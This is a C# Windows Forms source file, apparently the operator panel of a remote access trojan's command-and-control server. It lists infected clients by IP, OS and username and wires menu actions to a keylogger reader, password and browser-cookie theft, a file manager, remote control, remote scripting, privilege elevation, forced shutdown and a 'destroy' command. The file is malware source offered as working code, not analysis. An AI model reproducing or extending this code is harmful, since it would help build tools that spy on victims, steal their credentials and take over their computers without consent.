﻿using CNC.Config;
using CNC.Core.Data;
using CNC.Core.Helper;
using CNC.Core.Networking;
using CNC.Core.Security;
using CNC.Forms;
using NetworkCommsDotNet;
using NetworkCommsDotNet.Connections;
using Newtonsoft.Json;
using Shared.Enums;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CNC
{
    public partial class Main : Form
    {
        public static Main MainForm;
        private readonly object _lockClients = new object(); // lock for clients-listview


        public Main()
        {
            InitializeComponent();
            MainForm = this;
            UPnPHelper.ThreadedForward();
        }

        public void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                // this " " leaves some space between the flag-icon and first item
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.Connection.ConnectionInfo.RemoteEndPoint.ToString(),
                    client.OperatingSystem, client.AccountType,
                    client.Username
                }){ Tag = client};;

                clientListView.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        clientListView.Items.Add(lvi);
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                clientListView.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in clientListView.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }



        //SINGLE SELECT

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProcessList processListWindow = new ProcessList((Client)clientListView.FocusedItem.Tag);
            processListWindow.Show();
        }

        private void clientListView_MouseClick(object sender, MouseEventArgs e)
        {
            if(e.Button == MouseButtons.Right)
            {
                clientMenuStrip.Show(Cursor.Position);
            }
        }

        private void remoteControllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RemoteControll remoteControllWindow = new RemoteControll((Client)clientListView.FocusedItem.Tag);
            remoteControllWindow.Show();
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            KeyloggReader keylogReaderWindow = new KeyloggReader((Client)clientListView.FocusedItem.Tag);
            keylogReaderWindow.Show();
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FileExplorer fileExplorerWindow = new FileExplorer((Client)clientListView.FocusedItem.Tag);
            fileExplorerWindow.Show();
        }

        private void passwordExtractToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PasswordRecovery passwordRecoveryWindow = new PasswordRecovery((Client)clientListView.FocusedItem.Tag);
            passwordRecoveryWindow.Show();
        }

        private void cookieRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CookieRecovery cookieRecoveryWindow = new CookieRecovery((Client)clientListView.FocusedItem.Tag);
            cookieRecoveryWindow.Show();
        }

        private void eventsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            EventManager eventManagerWindow = new EventManager();
            eventManagerWindow.Show();
        }

        private void btnEvents_Click(object sender, EventArgs e)
        {
            EventManager eventManagerWindow = new EventManager();
            eventManagerWindow.Show();
        }

        private void systemInfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SysInfo systemInfoWindow = new SysInfo((Client)clientListView.FocusedItem.Tag);
            systemInfoWindow.Show();
        }

        //Multi select BELOW


        private void closeToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x10", 
                    Cryptography.Encrypt(Guid.NewGuid().ToString()));
            }
        }

        private void openWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            List<Client> clients = new List<Client>();
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                clients.Add((Client)clientListView.SelectedItems[i].Tag);
            }
            OpenWebsite openWebsiteForm = new OpenWebsite(clients.ToArray());
            openWebsiteForm.Show();
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            List<Client> clients = new List<Client>();
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                clients.Add((Client)clientListView.SelectedItems[i].Tag);
            }
            ShowMessageBox showMessageBoxForm = new ShowMessageBox(clients.ToArray());
            showMessageBoxForm.Show();
        }

        private void scriptingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            List<Client> clients = new List<Client>();
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                clients.Add((Client)clientListView.SelectedItems[i].Tag);
            }
            RemoteScript remoteScriptWindow = new RemoteScript(clients.ToArray());
            remoteScriptWindow.Show();
        }

        private void elevateApplicationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x12", Cryptography.Encrypt(Guid.NewGuid().ToString()));
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x07", 
                    Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Shutdown)));
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x07",
                    Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Restart)));
            }
        }

        private void sleepToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x07",
                    Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Sleep)));
            }
        }

        private void hibernateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x07",
                    Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Hibernate)));
            }
        }

        private void destroyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
            {
                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x27",
                    Cryptography.Encrypt(Guid.NewGuid().ToString()));
            }
        }

    }
}
